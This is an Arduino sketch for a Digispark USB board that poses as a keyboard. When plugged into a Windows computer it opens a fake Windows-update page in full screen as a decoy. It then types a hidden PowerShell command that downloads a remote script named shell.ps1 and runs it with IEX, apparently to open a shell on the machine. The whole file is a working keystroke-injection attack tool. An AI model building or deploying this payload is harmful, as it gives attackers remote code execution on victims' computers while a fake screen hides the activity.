#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:
}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://fakeupdate.net/win10ue/");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  DigiKeyboard.delay(500);  

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/araujoricardo/Digispark/main/shell.ps1');");  

  for(;;){ /*empty*/ }
}
